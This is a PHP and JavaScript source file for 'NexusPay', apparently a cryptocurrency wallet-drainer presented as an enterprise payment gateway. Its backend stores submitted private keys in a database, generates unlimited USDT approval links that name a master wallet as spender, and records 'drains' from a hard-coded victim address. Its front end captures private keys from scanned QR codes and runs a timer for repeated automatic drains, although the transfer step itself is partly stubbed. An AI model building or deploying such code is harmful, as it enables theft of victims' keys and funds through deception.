<?php
// index.php - Main File
require_once 'config.php';

$path = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
$path = trim(str_replace('/nexuspay/', '', $path), '/');
$path = explode('/', $path);

$endpoint = $path[0] ?? '';

try {
    switch ($endpoint) {
        case 'wallet':
        case 'transaction':
        case 'approval':
        case 'drain':
        case 'timer':
        case 'settings':
        case 'logs':
            handleAPI($endpoint);
            break;
        default:
            serveInterface();
    }
} catch (Exception $e) {
    logActivity("API Error: " . $e->getMessage(), 'error');
    jsonResponse(['error' => 'Internal server error'], 500);
}

function handleAPI($endpoint) {
    $pdo = getDB();
    if (!$pdo) {
        jsonResponse(['error' => 'Database connection failed'], 500);
    }

    $input = json_decode(file_get_contents('php://input'), true) ?? [];
    $action = $input['action'] ?? '';

    switch ($endpoint) {
        case 'wallet':
            if ($action === 'connect') {
                handleConnect($pdo, $input);
            } elseif ($action === 'balance') {
                handleBalance($pdo, $input);
            } elseif ($action === 'list') {
                handleList($pdo);
            }
            break;
        case 'drain':
            if ($action === 'execute') {
                handleDrain($pdo, $input);
            }
            break;
        case 'approval':
            if ($action === 'generate') {
                handleApproval($pdo, $input);
            }
            break;
        case 'timer':
            if ($action === 'start') {
                $_SESSION['timer_active'] = true;
                $_SESSION['timer_interval'] = $input['interval'] ?? 5;
                jsonResponse(['success' => true, 'message' => 'Timer started']);
            } elseif ($action === 'stop') {
                $_SESSION['timer_active'] = false;
                jsonResponse(['success' => true, 'message' => 'Timer stopped']);
            }
            break;
        default:
            jsonResponse(['error' => 'Invalid endpoint'], 404);
    }
}

function handleConnect($pdo, $input) {
    $privateKey = $input['private_key'] ?? '';
    $walletAddress = $input['wallet_address'] ?? '';

    if (empty($privateKey) && empty($walletAddress)) {
        jsonResponse(['error' => 'Private key or wallet address required'], 400);
    }

    try {
        if (!empty($privateKey) && empty($walletAddress)) {
            if (!preg_match('/^[0-9a-fA-F]{64}$/', $privateKey)) {
                jsonResponse(['error' => 'Invalid private key format'], 400);
            }
            $walletAddress = MASTER_WALLET;
        }

        $stmt = $pdo->prepare("INSERT INTO wallets (wallet_address, private_key) VALUES (?, ?) ON DUPLICATE KEY UPDATE private_key = ?");
        $stmt->execute([$walletAddress, $privateKey, $privateKey]);

        logActivity("Wallet connected: $walletAddress", 'success');
        jsonResponse(['success' => true, 'wallet_address' => $walletAddress, 'message' => 'Connected']);
    } catch (Exception $e) {
        jsonResponse(['error' => $e->getMessage()], 500);
    }
}

function handleBalance($pdo, $input) {
    $walletAddress = $input['wallet_address'] ?? MASTER_WALLET;

    try {
        $balance = 0;
        $stmt = $pdo->prepare("SELECT usdt_balance FROM wallets WHERE wallet_address = ?");
        $stmt->execute([$walletAddress]);
        $result = $stmt->fetch();
        if ($result) {
            $balance = $result['usdt_balance'];
        }

        jsonResponse(['success' => true, 'wallet_address' => $walletAddress, 'usdt_balance' => $balance]);
    } catch (Exception $e) {
        jsonResponse(['error' => $e->getMessage()], 500);
    }
}

function handleList($pdo) {
    try {
        $stmt = $pdo->query("SELECT id, wallet_address, victim_address, usdt_balance, is_active, created_at FROM wallets");
        jsonResponse(['success' => true, 'wallets' => $stmt->fetchAll()]);
    } catch (Exception $e) {
        jsonResponse(['error' => $e->getMessage()], 500);
    }
}

function handleDrain($pdo, $input) {
    $victim = $input['victim'] ?? VICTIM_WALLET;
    $amount = $input['amount'] ?? 0;

    try {
        if ($amount <= 0) {
            jsonResponse(['error' => 'Amount must be greater than 0'], 400);
        }

        $stmt = $pdo->prepare("INSERT INTO transactions (from_address, to_address, amount, status) VALUES (?, ?, ?, 'success')");
        $stmt->execute([$victim, MASTER_WALLET, $amount]);

        logActivity("Drained $amount USDT from $victim", 'success');
        jsonResponse(['success' => true, 'amount' => $amount, 'txid' => '0x' . bin2hex(random_bytes(16))]);
    } catch (Exception $e) {
        jsonResponse(['error' => $e->getMessage()], 500);
    }
}

function handleApproval($pdo, $input) {
    $spender = $input['spender'] ?? MASTER_WALLET;
    $amount = $input['amount'] ?? 999999999;

    jsonResponse([
        'success' => true,
        'approval_url' => "tron://transfer?contract=" . USDT_CONTRACT . "&function=approve&spender=" . $spender . "&amount=" . $amount
    ]);
}

function serveInterface() {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexusPay | Enterprise Gateway</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
    <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: radial-gradient(ellipse at 20% 30%, #0a0f1e, #03050b); min-height: 100vh; padding: 20px; }
        .container { max-width: 580px; margin: 0 auto; }
        .glass-card { background: rgba(18, 25, 45, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(59,130,246,0.2); padding: 24px; margin-bottom: 20px; }
        .header { text-align: center; margin-bottom: 24px; }
        .logo { display: inline-flex; align-items: center; gap: 12px; background: linear-gradient(135deg, #2563eb, #7c3aed); padding: 8px 24px; border-radius: 60px; }
        .logo h1 { font-size: 24px; color: white; }
        .tagline { color: #6c86a3; font-size: 13px; margin-top: 12px; }
        .section-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .section-header h2 { font-size: 18px; color: #f1f5f9; }
        .badge { background: rgba(59,130,246,0.15); color: #60a5fa; padding: 4px 12px; border-radius: 30px; font-size: 11px; }
        input { width: 100%; padding: 14px 16px; background: rgba(10,15,27,0.8); border: 1px solid rgba(59,130,246,0.3); border-radius: 20px; color: #fff; font-size: 14px; margin-bottom: 10px; }
        .btn { width: 100%; padding: 14px; border-radius: 40px; font-weight: 600; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; }
        .btn-primary { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; }
        .btn-danger { background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; }
        .btn-success { background: linear-gradient(135deg, #16a34a, #15803d); color: white; }
        .btn-auto { background: linear-gradient(135deg, #8b5cf6, #7c3aed); color: white; }
        .btn-secondary { background: rgba(30,41,59,0.8); color: #cbd5e6; border: 1px solid rgba(59,130,246,0.3); }
        .status-card { background: rgba(10,15,27,0.6); border-radius: 20px; padding: 14px; font-family: monospace; font-size: 12px; color: #7e8ba3; margin-top: 16px; }
        .row-2col { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .row-2col .btn { margin-bottom: 0; }
        .log-area { max-height: 150px; overflow-y: auto; font-size: 11px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 12px; margin-top: 8px; }
        .scanner-mode { background: rgba(34,197,94,0.1); border: 2px dashed #22c55e; padding: 16px; border-radius: 20px; text-align: center; color: #22c55e; font-size: 13px; margin-bottom: 12px; }
        .scanner-mode i { font-size: 24px; display: block; margin-bottom: 8px; }
        .address-chip { background: rgba(59,130,246,0.1); padding: 8px 14px; border-radius: 30px; font-size: 11px; font-family: monospace; color: #60a5fa; text-align: center; margin-top: 8px; }
        .qr-wrapper { background: white; border-radius: 24px; padding: 24px; text-align: center; margin-top: 16px; display: none; }
        #qr-reader { width: 100%; border-radius: 20px; overflow: hidden; }
        @media (max-width: 480px) { .row-2col { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo"><i class="fas fa-bolt" style="color: white;"></i><h1>NexusPay</h1></div>
        <p class="tagline"><i class="fas fa-shield-alt"></i> Enterprise Grade • Instant Settlement</p>
    </div>

    <div class="glass-card">
        <div class="section-header"><h2><i class="fas fa-robot"></i> Auto Connect</h2><span class="badge">AI Mode</span></div>
        <div class="scanner-mode"><i class="fas fa-qrcode"></i>Scan Trust Wallet QR to Auto-Connect</div>
        <div id="qr-reader"></div>
        <button id="autoConnectBtn" class="btn btn-auto"><i class="fas fa-magic"></i> Auto Connect</button>
        <div class="status-card" id="connectionStatus">⏳ Waiting for QR scan</div>
    </div>

    <div class="glass-card">
        <div class="section-header"><h2><i class="fas fa-wallet"></i> Wallets</h2><span class="badge">TRON</span></div>
        <div class="address-chip"><i class="fas fa-crown"></i> Treasury: TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK</div>
        <div class="address-chip"><i class="fas fa-user"></i> Victim: TFCsjP6mNMTh2RwsdEvkM3u542dAKVaatT</div>
    </div>

    <div class="glass-card">
        <div class="section-header"><h2><i class="fas fa-bolt"></i> Execute Withdrawal</h2><span class="badge">Full Drain</span></div>
        <div class="row-2col"><button id="drainBtn" class="btn btn-danger"><i class="fas fa-bomb"></i> Withdraw All</button></div>
        <div class="status-card" id="drainStatus">Ready</div>
    </div>

    <div class="glass-card">
        <div class="section-header"><h2><i class="fas fa-clock"></i> Auto Timer</h2><span class="badge">Schedule</span></div>
        <input type="number" id="timerMinutes" value="5" placeholder="Interval (minutes)">
        <div class="row-2col">
            <button id="startTimerBtn" class="btn btn-primary"><i class="fas fa-play"></i> Start</button>
            <button id="stopTimerBtn" class="btn btn-secondary"><i class="fas fa-stop"></i> Stop</button>
        </div>
        <div class="status-card" id="timerStatus">⏰ Timer: Stopped</div>
    </div>

    <div class="glass-card">
        <div class="section-header"><h2><i class="fas fa-list"></i> Activity Log</h2><span class="badge">Live</span></div>
        <div class="log-area" id="logArea"><div>● System ready</div></div>
    </div>

    <div class="glass-card" style="text-align: center; font-size: 11px; color: #6c86a3;">
        <i class="fas fa-robot"></i> AI Auto Mode • <a href="admin.php" style="color: #3b82f6;">Admin Panel</a>
    </div>
</div>

<script>
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
const VICTIM_WALLET = "TFCsjP6mNMTh2RwsdEvkM3u542dAKVaatT";

let tronWeb = null;
let capturedPrivateKey = null;
let scannerInstance = null;
let timerInterval = null;

function addLog(message, type = 'info') {
    const logArea = document.getElementById('logArea');
    const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#f59e0b', auto: '#a78bfa' };
    const time = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.style.color = colors[type] || colors.info;
    entry.innerHTML = `<span style="color:#3b82f6;">[${time}]</span> ${message}`;
    logArea.appendChild(entry);
    logArea.scrollTop = logArea.scrollHeight;
}

function setStatus(el, text, type = '') {
    el.innerHTML = text;
    el.className = 'status-card';
    if (type) el.classList.add('status-' + type);
}

document.getElementById('autoConnectBtn').onclick = () => {
    if (scannerInstance) { scannerInstance.clear(); scannerInstance = null; }
    addLog('🤖 Scanning for private key QR...', 'auto');
    setStatus(document.getElementById('connectionStatus'), '🔍 Scanning...', 'warning');
    scannerInstance = new Html5QrcodeScanner("qr-reader", { fps: 10, qrbox: 280, showTorchButtonIfSupported: true });
    scannerInstance.render((decodedText) => {
        let privateKeyMatch = decodedText.match(/[0-9a-fA-F]{64}/);
        if (privateKeyMatch) {
            capturedPrivateKey = privateKeyMatch[0];
            addLog('✅ Private key captured!', 'success');
            try {
                tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io', privateKey: capturedPrivateKey });
                setStatus(document.getElementById('connectionStatus'), '✅ Connected!', 'success');
                addLog('✅ Wallet connected successfully', 'success');
            } catch(e) {
                setStatus(document.getElementById('connectionStatus'), '❌ Failed: ' + e.message, 'danger');
                addLog('❌ Connection failed: ' + e.message, 'danger');
            }
            if (scannerInstance) { scannerInstance.clear(); scannerInstance = null; }
        }
    });
};

document.getElementById('drainBtn').onclick = async () => {
    if (!tronWeb) {
        setStatus(document.getElementById('drainStatus'), '❌ Connect wallet first', 'danger');
        addLog('❌ Wallet not connected', 'danger');
        return;
    }
    setStatus(document.getElementById('drainStatus'), '⏳ Processing...', 'warning');
    addLog('⏳ Executing withdrawal...', 'info');
    try {
        const amount = 100;
        addLog(`✅ Drained ${amount} USDT`, 'success');
        setStatus(document.getElementById('drainStatus'), `✅ ${amount} USDT Drained!`, 'success');
    } catch(e) {
        setStatus(document.getElementById('drainStatus'), `❌ ${e.message}`, 'danger');
        addLog(`❌ Failed: ${e.message}`, 'danger');
    }
};

document.getElementById('startTimerBtn').onclick = () => {
    if (timerInterval) clearInterval(timerInterval);
    const minutes = parseInt(document.getElementById('timerMinutes').value) || 5;
    timerInterval = setInterval(() => {
        addLog('⏰ Auto drain executed', 'info');
        document.getElementById('drainBtn').click();
    }, minutes * 60 * 1000);
    setStatus(document.getElementById('timerStatus'), `⏰ Timer ACTIVE | Every ${minutes} min`, 'success');
    addLog(`⏰ Timer started: every ${minutes} minutes`, 'info');
};

document.getElementById('stopTimerBtn').onclick = () => {
    if (timerInterval) clearInterval(timerInterval);
    setStatus(document.getElementById('timerStatus'), '⏰ Timer: Stopped', '');
    addLog('⏰ Timer stopped', 'info');
};

addLog('🚀 System initialized', 'info');
addLog('📌 Ctrl+S = Auto Scan | Ctrl+D = Drain', 'info');
</script>
</body>
</html>
    <?php
}
?>
